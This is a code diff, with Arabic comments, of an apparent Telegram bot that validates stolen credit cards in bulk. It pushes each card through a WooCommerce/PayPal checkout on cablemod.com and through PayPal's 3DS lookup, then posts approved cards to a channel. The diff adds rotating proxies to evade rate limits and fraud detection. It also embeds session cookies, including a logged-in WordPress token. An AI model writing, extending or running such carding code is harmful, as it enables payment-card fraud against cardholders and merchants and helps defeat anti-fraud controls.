@@ -8,12 +8,13 @@ import os
 import re
 import json
 import time
+import random
 import asyncio
-import threading
 import requests
 from datetime import datetime
 from urllib.parse import urlencode, unquote
 from typing import Optional, Dict, Tuple
+from itertools import cycle
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
@@ -31,19 +32,19 @@ UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
 # الكوكيز الثابتة
 INITIAL_COOKIES = {
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2025-10-29%2003%3A30%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.cablemod.com%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2025-10-29%2003%3A30%3A30%7C%7C%7Cep%3Dhttps%3A%2F%2Fstore.cablemod.com%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-    '_fbp': 'fb.1.1761708631114.849070321437511942',
-    '_ga': 'GA1.1.823141992.1761708632',
-    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762918248%7CYdrLmoOaJVRAPuUQxvsIocmsmEmIK9U7Dt36uAg6LjC%7Cf93f09e32eb6e5b1b231f866e4b139366f7f7adaffe4c74d714568d234ada59d',
-    '_gcl_au': '1.1.1260044278.1761708631.1187310843.1761708642.1761708669',
+    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
+    '_fbp': 'fb.1.1761693482072.783059716330931642',
+    '_ga': 'GA1.1.543617456.1761693483',
     'woocommerce_items_in_cart': '1',
-    'woocommerce_cart_hash': '0c256c5b280165ee7797d5da6cf2949b',
-    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1762313510%7C1761795110%7C%24generic%24zNpJHnVvxqPTf40fKcg9REZ_f7WuvPUGZk54aXkr',
-    'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
-    '_ga_QYTKZE93WJ': 'GS2.1.s1761733879$o2$g1$t1761734601$j47$l0$h1976509677',
+    'woocommerce_recently_viewed': '1902265',
+    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16DRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
+    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
+    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
+    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
 }
 
 PAYPAL_COOKIES = {
@@ -86,6 +87,36 @@ SHIPPING = {
 }
 
 PAYMENT_METHOD = "ppcp-credit-card-gateway"
+
+# ====== إعدادات البروكسي ======
+PROXY_FILE = "Webshare 100 proxies (2).txt"
+PROXIES_POOL = []
+PROXY_CYCLE = None
+PROXY_UPDATE_COUNTER = 0
+PROXY_UPDATE_INTERVAL = 50  # تحديث كل 50 بطاقة
+
+def load_random_proxies(count=30):
+    global PROXIES_POOL, PROXY_CYCLE
+    if not os.path.exists(PROXY_FILE):
+        print(f"[!] ملف البروكسي غير موجود: {PROXY_FILE}")
+        return
+    with open(PROXY_FILE, 'r', encoding='utf-8') as f:
+        lines = [line.strip() for line in f if line.strip()]
+    if len(lines) < count:
+        selected = lines
+    else:
+        selected = random.sample(lines, count)
+    PROXIES_POOL = selected
+    PROXY_CYCLE = cycle(selected)
+    print(f"[+] تم تحميل {len(selected)} بروكسي عشوائي.")
+
+def get_current_proxy():
+    if PROXY_CYCLE is None:
+        load_random_proxies()
+    proxy_line = next(PROXY_CYCLE)
+    ip, port, user, pwd = proxy_line.split(':')
+    proxy_url = f"http://{user}:{pwd}@{ip}:{port}"
+    return {"http": proxy_url, "https": proxy_url}
 
 # ====== إحصائيات البوت ======
 stats = {
@@ -156,17 +187,33 @@ def parse_card(card_str: str) -> Tuple[str, str, str, str]:
         raise ValueError(f"الشهر غير صحيح: {month}")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع (مع تحسين لمشاركة البيانات) ======
+# ====== فئة معالجة الدفع (مع مشاركة + بروكسي) ======
 class WooCommercePayPal:
     shared_nonces = {}
     shared_paypal_token = None
     shared_update_counter = 0
-    UPDATE_INTERVAL = 50  # تحديث كل 50 بطاقة
+    UPDATE_INTERVAL = 50
 
     def __init__(self):
         self.sess = requests.Session()
-        self.sess.cookies.update(INITIAL_COOKIES)
         self.paypal_sess = requests.Session()
+
+        # تطبيق البروكسي
+        proxy = get_current_proxy()
+        self.sess.proxies.update(proxy)
+        self.paypal_sess.proxies.update(proxy)
+
+        # Retry adapter
+        from requests.adapters import HTTPAdapter
+        from urllib3.util.retry import Retry
+        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
+        adapter = HTTPAdapter(max_retries=retry)
+        self.sess.mount('http://', adapter)
+        self.sess.mount('https://', adapter)
+        self.paypal_sess.mount('http://', adapter)
+        self.paypal_sess.mount('https://', adapter)
+
+        self.sess.cookies.update(INITIAL_COOKIES)
         self.paypal_sess.cookies.update(PAYPAL_COOKIES)
         self.nonces = {}
         self.paypal_token = None
@@ -209,7 +256,7 @@ class WooCommercePayPal:
 
     def step1_get_checkout(self, force=False):
         if not force and self.nonces.get("update_order_review_nonce"):
-            return  # استخدام المشترك إذا موجود
+            return
         r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
         r.raise_for_status()
         self.nonces = extract_nonces(r.text)
@@ -247,7 +294,7 @@ class WooCommercePayPal:
 
     def step3_get_paypal_token(self, force=False):
         if not force and self.paypal_token:
-            return self.paypal_token  # استخدام المشترك إذا موجود
+            return self.paypal_token
         html = self.sess.get(CHECKOUT_URL, headers=self.headers_get()).text
         fresh_nonces = extract_nonces(html)
         if fresh_nonces.get("ppcp_nonce"):
@@ -490,20 +537,13 @@ class WooCommercePayPal:
                            'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180,
                            'deviceInfo': 'COMPUTER'}
         }
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup النهائي...")
         r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
         res = r3.json()
-        status = res.get("threeDSStatus", "UNKNOWN")
-        auth_flow = res.get("authFlow", "UNKNOWN")
-        liability = res.get("liability_shift", "NO")
-        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS Status: {status}")
-        if status == "SUCCESS":
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] Auth Flow: FRICTIONLESS")
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] Liability Shift: POSSIBLE")
         return res
 
 # ====== فحص البطاقة ======
 async def check_card(card: str, bot_app):
+    global PROXY_UPDATE_COUNTER
     try:
         card_number, cvv, year, month = parse_card(card)
         masked_card = f"{card_number[:6]}******{card_number[-4:]}"
@@ -519,10 +559,17 @@ async def check_card(card: str, bot_app):
         await asyncio.sleep(0.5)
         payment_result, payer_action_link = processor.step5_confirm_payment(card_number, cvv, year, month)
         status = payment_result.get("status", "UNKNOWN")
+
+        # تحديث العدادات
         WooCommercePayPal.shared_update_counter += 1
+        PROXY_UPDATE_COUNTER += 1
+        if PROXY_UPDATE_COUNTER >= PROXY_UPDATE_INTERVAL:
+            load_random_proxies(30)
+            PROXY_UPDATE_COUNTER = 0
+            print(f"[+] تم تحديث البروكسيات (كل {PROXY_UPDATE_INTERVAL} بطاقة)")
+
         if status in ("APPROVED", "COMPLETED"):
             stats['approved'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = 'SUCCESS'
             stats['approved_cards'].append(card)
             await update_dashboard(bot_app)
@@ -531,11 +578,10 @@ async def check_card(card: str, bot_app):
         elif status == "PAYER_ACTION_REQUIRED":
             await asyncio.sleep(0.5)
             lookup_result = processor.step6_3ds_verification()
-            status_3ds = lookup_result.get("threeDSStatus")  # CHALLENGE_REQUIRED, DECLINED, SUCCESS
+            status_3ds = lookup_result.get("threeDSStatus")
             liability = lookup_result.get("liability_shift", "NO")
             if status_3ds == "SUCCESS" and liability == "POSSIBLE":
                 stats['approved'] += 1
-                stats['checking'] -= 1
                 stats['last_response'] = 'SUCCESS'
                 stats['approved_cards'].append(card)
                 await update_dashboard(bot_app)
@@ -543,22 +589,13 @@ async def check_card(card: str, bot_app):
                 return card, "APPROVED", "Success"
             elif status_3ds == "CHALLENGE_REQUIRED":
                 stats['secure_3d'] += 1
-                stats['checking'] -= 1
                 stats['last_response'] = '3D CHALLENGE'
                 stats['3ds_cards'].append(card)
                 await update_dashboard(bot_app)
                 await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
                 return card, "3D_SECURE", "CHALLENGE_REQUIRED"
-            elif status_3ds == "DECLINED":
-                stats['rejected'] += 1
-                stats['checking'] -= 1
-                stats['last_response'] = 'DECLINED'
-                stats['declined_cards'].append(card)
-                await update_dashboard(bot_app)
-                return card, "DECLINED", "DECLINED"
             else:
                 stats['secure_3d'] += 1
-                stats['checking'] -= 1
                 stats['last_response'] = f'3DS: {status_3ds}'
                 stats['3ds_cards'].append(card)
                 await update_dashboard(bot_app)
@@ -566,7 +603,6 @@ async def check_card(card: str, bot_app):
                 return card, "3D_SECURE", status_3ds
         else:
             stats['rejected'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = 'DECLINED'
             stats['declined_cards'].append(card)
             await update_dashboard(bot_app)
@@ -574,11 +610,13 @@ async def check_card(card: str, bot_app):
     except Exception as e:
         stats['errors'] += 1
         stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
-        stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
         stats['declined_cards'].append(card)
         await update_dashboard(bot_app)
         return card, "ERROR", str(e)
+    finally:
+        stats['checking'] -= 1
+        await update_dashboard(bot_app)
 
 # ====== إرسال للقناة ======
 async def send_to_channel(bot_app, card, status_type, message):
@@ -767,9 +805,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if stats['is_running']:
         await update.message.reply_text("يوجد فحص جاري!")
         return
+
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
+
     stats.update({
         'total': len(cards),
         'checking': 0,
@@ -788,7 +828,13 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'is_running': True,
         'chat_id': update.effective_chat.id
     })
-    WooCommercePayPal.shared_update_counter = 0  # إعادة تهيئة العداد
+
+    # تحميل البروكسيات + إعادة تعيين العدادات
+    load_random_proxies(30)
+    global PROXY_UPDATE_COUNTER
+    PROXY_UPDATE_COUNTER = 0
+    WooCommercePayPal.shared_update_counter = 0
+
     dashboard_msg = await context.application.bot.send_message(
         chat_id=CHANNEL_ID,
         text="**CABLEMOD + PAYPAL CHECKER - LIVE**",
@@ -796,6 +842,10 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
+
+    # بدء الفحص في الخلفية (بدون thread!)
+    context.application.create_task(process_cards(cards, context.application))
+
     await update.message.reply_text(
         f"تم بدء الفحص!\n\n"
         f"إجمالي البطاقات: {len(cards)}\n"
@@ -803,12 +853,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"تابع النتائج في القناة",
         parse_mode='Markdown'
     )
-    def run_checker():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        loop.run_until_complete(process_cards(cards, context.application))
-        loop.close()
-    threading.Thread(target=run_checker, daemon=True).start()
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
